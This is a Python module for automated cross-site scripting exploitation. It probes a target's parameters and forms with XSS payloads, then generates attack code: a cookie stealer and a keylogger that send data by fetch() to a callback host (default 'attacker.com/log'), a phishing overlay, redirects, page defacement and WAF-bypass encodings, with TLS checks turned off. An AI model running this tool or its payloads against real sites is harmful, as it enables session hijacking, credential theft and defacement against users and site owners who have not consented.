"""
XSS Exploit Module
Automated exploitation of Cross-Site Scripting vulnerabilities
"""

import requests
import time
import base64
import json
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote


class XSSExploit:
    """
    Automated XSS exploitation framework
    Supports Reflected, Stored, and DOM-based XSS
    """

    def __init__(self, target_url: str, timeout: int = 10, delay: float = 0.3):
        """
        Initialize XSS exploit

        Args:
            target_url: Target URL
            timeout: Request timeout
            delay: Delay between requests
        """
        self.target_url = target_url
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.successful_payloads = []
        self.extracted_data = []

    def test_reflected_xss(
        self, parameter: str, payloads: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Test for reflected XSS

        Args:
            parameter: Parameter name to test
            payloads: Custom payloads (uses default if None)

        Returns:
            Test results
        """
        print(f"[*] Testing reflected XSS on parameter: {parameter}")

        if not payloads:
            payloads = self._get_default_xss_payloads()

        results = {
            "vulnerable": False,
            "successful_payloads": [],
            "context": None,
            "exploitation_type": "reflected",
        }

        for payload in payloads:
            response = self._send_xss_payload(parameter, payload)

            if response and self._check_xss_reflection(response, payload):
                print(f"[+] Reflected XSS confirmed with payload: {payload[:50]}...")
                results["vulnerable"] = True
                results["successful_payloads"].append(payload)
                results["context"] = self._detect_xss_context(response, payload)

                self.successful_payloads.append(
                    {
                        "parameter": parameter,
                        "payload": payload,
                        "type": "reflected",
                        "context": results["context"],
                    }
                )

            time.sleep(self.delay)

        return results

    def test_stored_xss(
        self,
        form_data: Dict[str, str],
        target_page: str,
        payloads: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """
        Test for stored XSS

        Args:
            form_data: Form data dict with fields to submit
            target_page: Page where XSS should be reflected
            payloads: Custom payloads

        Returns:
            Test results
        """
        print(f"[*] Testing stored XSS")

        if not payloads:
            payloads = self._get_default_xss_payloads()

        results = {
            "vulnerable": False,
            "successful_payloads": [],
            "storage_location": target_page,
            "exploitation_type": "stored",
        }

        for field_name in form_data.keys():
            print(f"[*] Testing field: {field_name}")

            for payload in payloads[:10]:  # Limit stored XSS tests
                # Submit payload
                test_data = form_data.copy()
                test_data[field_name] = payload

                submit_response = self._submit_form(test_data)

                if submit_response:
                    time.sleep(1)  # Wait for storage

                    # Check target page for reflection
                    check_response = self._check_stored_xss(target_page, payload)

                    if check_response:
                        print(f"[+] Stored XSS confirmed in field: {field_name}")
                        results["vulnerable"] = True
                        results["successful_payloads"].append(
                            {"field": field_name, "payload": payload}
                        )

                        self.successful_payloads.append(
                            {
                                "field": field_name,
                                "payload": payload,
                                "type": "stored",
                                "storage_page": target_page,
                            }
                        )

                        break  # Move to next field

                time.sleep(self.delay)

        return results

    def test_dom_xss(self, parameter: str) -> Dict[str, Any]:
        """
        Test for DOM-based XSS

        Args:
            parameter: Parameter to test

        Returns:
            Test results
        """
        print(f"[*] Testing DOM-based XSS on parameter: {parameter}")

        # DOM XSS payloads that manipulate DOM
        dom_payloads = [
            "#<img src=x onerror=alert('XSS')>",
            "#';alert('XSS');//",
            "#<script>alert('XSS')</script>",
            "#javascript:alert('XSS')",
            "#';var x=document.createElement('img');x.src='x';x.onerror=alert;document.body.appendChild(x);//",
        ]

        results = {
            "vulnerable": False,
            "successful_payloads": [],
            "exploitation_type": "dom",
        }

        for payload in dom_payloads:
            # Test with fragment identifier
            test_url = f"{self.target_url}{payload}"

            try:
                response = self.session.get(
                    test_url, timeout=self.timeout, verify=False
                )

                # Check if payload appears in JavaScript context
                if self._check_dom_xss_indicators(response, payload):
                    print(f"[+] Potential DOM XSS found with payload: {payload}")
                    results["vulnerable"] = True
                    results["successful_payloads"].append(payload)

                    self.successful_payloads.append(
                        {"parameter": parameter, "payload": payload, "type": "dom"}
                    )

            except Exception as e:
                pass

            time.sleep(self.delay)

        return results

    def generate_session_stealer(self, callback_url: str) -> str:
        """
        Generate session stealing payload

        Args:
            callback_url: URL to send stolen data to

        Returns:
            XSS payload that steals session
        """
        print(f"[*] Generating session stealer payload")

        # JavaScript to steal cookies
        stealer_js = f"""
        <script>
        var cookies = document.cookie;
        var url = '{callback_url}?data=' + encodeURIComponent(cookies);
        fetch(url, {{method: 'GET', mode: 'no-cors'}});
        </script>
        """

        # Minified version
        stealer_compact = f"<script>fetch('{callback_url}?c='+document.cookie,{{mode:'no-cors'}})</script>"

        print(f"[+] Session stealer payload generated")
        return stealer_compact

    def generate_keylogger(self, callback_url: str) -> str:
        """
        Generate keylogger payload

        Args:
            callback_url: URL to send keystrokes to

        Returns:
            XSS payload that logs keystrokes
        """
        print(f"[*] Generating keylogger payload")

        keylogger_js = f"""
        <script>
        var keys = '';
        document.addEventListener('keypress', function(e) {{
            keys += e.key;
            if(keys.length > 50) {{
                fetch('{callback_url}?keys=' + encodeURIComponent(keys), {{mode: 'no-cors'}});
                keys = '';
            }}
        }});
        </script>
        """

        print(f"[+] Keylogger payload generated")
        return keylogger_js

    def generate_phishing_overlay(self, phishing_form_html: str) -> str:
        """
        Generate phishing overlay payload

        Args:
            phishing_form_html: HTML for phishing form

        Returns:
            XSS payload that displays phishing overlay
        """
        print(f"[*] Generating phishing overlay")

        overlay_js = f"""
        <script>
        var overlay = document.createElement('div');
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
        overlay.style.zIndex = '10000';
        overlay.innerHTML = `{phishing_form_html}`;
        document.body.appendChild(overlay);
        </script>
        """

        print(f"[+] Phishing overlay generated")
        return overlay_js

    def generate_redirect_payload(self, redirect_url: str) -> str:
        """
        Generate redirect payload

        Args:
            redirect_url: URL to redirect to

        Returns:
            XSS payload that redirects
        """
        redirect_payloads = [
            f"<script>window.location='{redirect_url}'</script>",
            f"<script>document.location='{redirect_url}'</script>",
            f"<meta http-equiv='refresh' content='0;url={redirect_url}'>",
            f"<script>setTimeout(function(){{window.location='{redirect_url}'}},1000)</script>",
        ]

        return redirect_payloads[0]

    def generate_defacement_payload(self, message: str) -> str:
        """
        Generate page defacement payload

        Args:
            message: Defacement message

        Returns:
            XSS payload that defaces page
        """
        defacement_js = f"""
        <script>
        document.body.innerHTML = '<div style="text-align:center;padding:100px;font-size:48px;color:red;">{message}</div>';
        </script>
        """

        return defacement_js

    def bypass_waf(self, original_payload: str) -> List[str]:
        """
        Generate WAF bypass variants of XSS payload

        Args:
            original_payload: Original XSS payload

        Returns:
            List of bypass variants
        """
        print(f"[*] Generating WAF bypass variants")

        bypass_variants = []

        # Case variation
        bypass_variants.append(original_payload.replace("script", "ScRiPt"))

        # HTML encoding
        encoded = "".join([f"&#x{ord(c):x};" for c in original_payload])
        bypass_variants.append(encoded)

        # URL encoding
        bypass_variants.append(quote(original_payload))

        # Double encoding
        bypass_variants.append(quote(quote(original_payload)))

        # Using different tags
        if "<script>" in original_payload:
            bypass_variants.append(
                original_payload.replace("<script>", "<img src=x onerror=")
            )
            bypass_variants.append(original_payload.replace("<script>", "<svg onload="))
            bypass_variants.append(
                original_payload.replace("<script>", "<body onload=")
            )

        # Comment injection
        bypass_variants.append(original_payload.replace("<script>", "<scr<!---->ipt>"))

        # Null byte injection
        bypass_variants.append(original_payload.replace("<script>", "<script\x00>"))

        # Using Unicode
        bypass_variants.append(
            "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>"
        )

        # Using eval and String.fromCharCode
        alert_charcode = ",".join([str(ord(c)) for c in "alert(1)"])
        bypass_variants.append(
            f"<script>eval(String.fromCharCode({alert_charcode}))</script>"
        )

        print(f"[+] Generated {len(bypass_variants)} bypass variants")
        return bypass_variants

    def _get_default_xss_payloads(self) -> List[str]:
        """Get default XSS test payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg><animate onbegin=alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "';alert('XSS');//",
            "<div onmouseover=alert('XSS')>hover</div>",
        ]

    def _send_xss_payload(
        self, parameter: str, payload: str
    ) -> Optional[requests.Response]:
        """Send XSS payload via GET parameter"""
        try:
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            params[parameter] = [payload]

            new_query = urlencode(params, doseq=True)
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            response = self.session.get(url, timeout=self.timeout, verify=False)
            return response

        except Exception as e:
            return None

    def _submit_form(self, form_data: Dict[str, str]) -> Optional[requests.Response]:
        """Submit form data for stored XSS test"""
        try:
            response = self.session.post(
                self.target_url, data=form_data, timeout=self.timeout, verify=False
            )
            return response
        except Exception as e:
            return None

    def _check_stored_xss(self, target_page: str, payload: str) -> bool:
        """Check if stored XSS payload appears on target page"""
        try:
            response = self.session.get(target_page, timeout=self.timeout, verify=False)
            return self._check_xss_reflection(response, payload)
        except Exception as e:
            return False

    def _check_xss_reflection(self, response: requests.Response, payload: str) -> bool:
        """Check if XSS payload is reflected in response"""
        if not response:
            return False

        # Check for exact payload reflection
        if payload in response.text:
            return True

        # Check for decoded payload
        try:
            from html import unescape

            unescaped_response = unescape(response.text)
            if payload in unescaped_response:
                return True
        except:
            pass

        return False

    def _detect_xss_context(self, response: requests.Response, payload: str) -> str:
        """Detect the context where XSS payload appears"""
        text = response.text.lower()
        payload_lower = payload.lower()

        # Find payload position
        if payload_lower not in text:
            return "unknown"

        pos = text.find(payload_lower)
        context_before = text[max(0, pos - 50) : pos]

        # Detect context
        if "<script" in context_before:
            return "javascript"
        elif "href=" in context_before or "src=" in context_before:
            return "attribute"
        elif "<" in context_before and ">" not in context_before:
            return "tag_attribute"
        else:
            return "html"

    def _check_dom_xss_indicators(
        self, response: requests.Response, payload: str
    ) -> bool:
        """Check for DOM XSS indicators"""
        text = response.text.lower()

        # Check for dangerous JavaScript functions with user input
        dangerous_patterns = [
            "document.write",
            "document.writeln",
            "innerhtml",
            "eval(",
            "location.hash",
            "location.search",
            "document.url",
        ]

        # Check if response contains JavaScript that uses location/URL
        return any(pattern in text for pattern in dangerous_patterns)

    def execute_full_exploitation(
        self,
        parameter: str,
        exploitation_goal: str = "cookie_theft",
        callback_url: str = "http://attacker.com/log",
    ) -> Dict[str, Any]:
        """
        Execute full XSS exploitation chain

        Args:
            parameter: Parameter to exploit
            exploitation_goal: Goal (cookie_theft, keylogging, phishing, defacement, redirect)
            callback_url: Callback URL for data exfiltration

        Returns:
            Exploitation results
        """
        print("=" * 60)
        print("XSS EXPLOITATION")
        print("=" * 60)

        results = {
            "success": False,
            "xss_type": None,
            "vulnerable_parameter": parameter,
            "working_payloads": [],
            "exploitation_payload": None,
        }

        # Step 1: Test reflected XSS
        reflected_results = self.test_reflected_xss(parameter)

        if reflected_results["vulnerable"]:
            results["success"] = True
            results["xss_type"] = "reflected"
            results["working_payloads"] = reflected_results["successful_payloads"]

            # Step 2: Generate exploitation payload based on goal
            if exploitation_goal == "cookie_theft":
                exploit_payload = self.generate_session_stealer(callback_url)
            elif exploitation_goal == "keylogging":
                exploit_payload = self.generate_keylogger(callback_url)
            elif exploitation_goal == "defacement":
                exploit_payload = self.generate_defacement_payload("HACKED")
            elif exploitation_goal == "redirect":
                exploit_payload = self.generate_redirect_payload(callback_url)
            else:
                exploit_payload = reflected_results["successful_payloads"][0]

            results["exploitation_payload"] = exploit_payload

            # Step 3: Test WAF bypass if needed
            bypass_payloads = self.bypass_waf(exploit_payload)
            results["bypass_payloads"] = bypass_payloads[:5]  # Top 5 variants

        # Step 4: Test DOM XSS if reflected failed
        if not results["success"]:
            dom_results = self.test_dom_xss(parameter)
            if dom_results["vulnerable"]:
                results["success"] = True
                results["xss_type"] = "dom"
                results["working_payloads"] = dom_results["successful_payloads"]

        print("=" * 60)
        print("EXPLOITATION COMPLETE")
        print(f"Success: {results['success']}")
        print(f"XSS Type: {results['xss_type']}")
        print(f"Working Payloads: {len(results['working_payloads'])}")
        print("=" * 60)

        return results

    def get_exploitation_summary(self) -> Dict[str, Any]:
        """Get summary of exploitation results"""
        return {
            "total_successful_payloads": len(self.successful_payloads),
            "successful_payloads": self.successful_payloads,
            "extracted_data": self.extracted_data,
        }
